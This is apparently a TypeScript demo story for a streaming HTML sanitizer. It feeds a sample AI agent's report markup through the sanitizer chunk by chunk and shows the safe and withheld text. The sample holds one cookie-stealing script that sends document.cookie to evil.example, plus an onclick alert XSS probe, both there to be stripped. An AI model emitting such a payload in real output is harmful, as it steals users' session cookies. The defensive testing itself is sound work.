import { SceneStore, StreamCoalescer, StreamingIngestion } from "@dopejs/deckle-core";
import { StreamingSanitizer } from "@dopejs/deckle-security";

export default {
  title: "Streaming",
};

/** A plausible agent response: prose, markup, and a script the host must drop. */
const AGENT_OUTPUT =
  '<section class="report">' +
  "<h2>Q3 revenue</h2>" +
  "<p>Revenue reached <strong>$4.2M</strong>, up 12% quarter over quarter.</p>" +
  "<ul><li>Subscriptions: $3.1M</li><li>Services: $1.1M</li></ul>" +
  '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>' +
  "<table><tr><th>Segment</th><th>Growth</th></tr>" +
  "<tr><td>Enterprise</td><td>18%</td></tr><tr><td>Self-serve</td><td>7%</td></tr></table>" +
  '<p onclick="alert(1)">Full breakdown in the appendix.</p>' +
  "</section>";

/** Split into uneven pieces the way a token stream arrives. */
function tokenize(text: string): string[] {
  const chunks: string[] = [];
  let index = 0;
  let step = 3;
  while (index < text.length) {
    chunks.push(text.slice(index, index + step));
    index += step;
    step = (step % 7) + 2;
  }
  return chunks;
}

function element<K extends keyof HTMLElementTagNameMap>(
  tag: K,
  css: string,
  text?: string,
): HTMLElementTagNameMap[K] {
  const node = document.createElement(tag);
  node.style.cssText = css;
  if (text !== undefined) node.textContent = text;
  return node;
}

/**
 * Watch an artifact arrive token by token. Only the safe prefix is ever
 * rendered: a half-written tag stays invisible until it closes, and the
 * unterminated `<script>` withholds everything after it until its closing tag
 * proves where the raw text ended. The artifact stays pinned in the `streaming`
 * lifecycle state, publishing provisional paint, until the stream completes.
 */
export const Agent_Stream = (): HTMLElement => {
  const root = element("div", "font: 13px system-ui; width: 900px;");

  const controls = element(
    "div",
    "display: flex; gap: 8px; align-items: center; margin-bottom: 10px;",
  );
  const playButton = element("button", "padding: 4px 12px;", "Stream");
  const stepButton = element("button", "padding: 4px 12px;", "Step");
  const resetButton = element("button", "padding: 4px 12px;", "Reset");
  const speed = element("input", "width: 120px;");
  speed.type = "range";
  speed.min = "0";
  speed.max = "120";
  speed.value = "24";
  const speedLabel = element("span", "color: #555;", "delay 24ms");
  controls.append(playButton, stepButton, resetButton, speed, speedLabel);

  const hud = element(
    "pre",
    "background: #f6f6f6; padding: 10px; border-radius: 6px; margin: 0 0 10px; white-space: pre-wrap;",
  );

  const panes = element("div", "display: flex; gap: 12px; align-items: flex-start;");
  const bufferPane = element(
    "pre",
    "flex: 1; margin: 0; padding: 10px; background: #14171b; color: #8b949e; border-radius: 6px; " +
      "height: 260px; overflow: auto; white-space: pre-wrap; word-break: break-all; font-size: 11.5px;",
  );
  const renderPane = element(
    "div",
    "flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 6px; height: 260px; overflow: auto;",
  );
  panes.append(bufferPane, renderPane);
  const shadow = renderPane.attachShadow({ mode: "open" });

  root.append(controls, hud, panes);

  let store: SceneStore;
  let handle: ReturnType<SceneStore["handleOf"]>;
  let sanitizer: StreamingSanitizer;
  let ingestion: StreamingIngestion;
  let chunks: string[];
  let cursor = 0;
  let clock = 0;
  let timer: number | null = null;

  const draw = (): void => {
    const update = sanitizer.current;
    const received = sanitizer.source;
    const safe = update.safeLength;
    // Green: decided and rendered. Amber: withheld until the stream continues.
    const decided = element("span", "color: #7ee787;", received.slice(0, safe));
    const withheld = element(
      "span",
      "color: #f0883e; background: rgba(240,136,62,.18);",
      received.slice(safe),
    );
    bufferPane.replaceChildren(decided, withheld);

    const record = store.get(handle);
    hud.textContent =
      `lifecycle ${record.lifecycle}   pins [${record.pins.join(", ") || "none"}]\n` +
      `received ${received.length} chars   safe ${safe} chars   withheld ${received.length - safe}` +
      `   reason ${update.pending ?? "—"}\n` +
      `sourceRevision ${record.revisions.sourceRevision}   draftRevision ${record.revisions.draftRevision}` +
      `   provisionalPaint ${record.revisions.provisionalPaintRevision}` +
      `   paint ${record.revisions.paintRevision}`;
  };

  const step = (): boolean => {
    if (cursor >= chunks.length) {
      if (!ingestion.settled) {
        const result = ingestion.finish();
        shadow.innerHTML = result.html;
        draw();
      }
      return false;
    }
    clock += Number(speed.value) || 1;
    const result = ingestion.push(chunks[cursor] as string, clock);
    cursor += 1;
    if (result.rendered) shadow.innerHTML = result.html;
    draw();
    return true;
  };

  const stop = (): void => {
    if (timer !== null) {
      clearInterval(timer);
      timer = null;
    }
    playButton.textContent = "Stream";
  };

  const reset = (): void => {
    stop();
    store = new SceneStore();
    handle = store.transact((tx) =>
      tx.createArtifact("agent-report", { x: 0, y: 0, width: 640, height: 480, zIndex: 0 }),
    );
    sanitizer = new StreamingSanitizer();
    ingestion = new StreamingIngestion(
      store,
      handle,
      sanitizer,
      new StreamCoalescer({ minIntervalMs: 40, minChars: 64 }),
    );
    chunks = tokenize(AGENT_OUTPUT);
    cursor = 0;
    clock = 0;
    shadow.innerHTML = "";
    draw();
  };

  playButton.addEventListener("click", () => {
    if (timer !== null) {
      stop();
      return;
    }
    playButton.textContent = "Pause";
    timer = window.setInterval(
      () => {
        if (!step()) stop();
      },
      Math.max(8, Number(speed.value)),
    );
  });
  stepButton.addEventListener("click", () => {
    stop();
    step();
  });
  resetButton.addEventListener("click", reset);
  speed.addEventListener("input", () => {
    speedLabel.textContent = `delay ${speed.value}ms`;
    if (timer !== null) {
      stop();
      playButton.click();
    }
  });

  reset();
  return root;
};
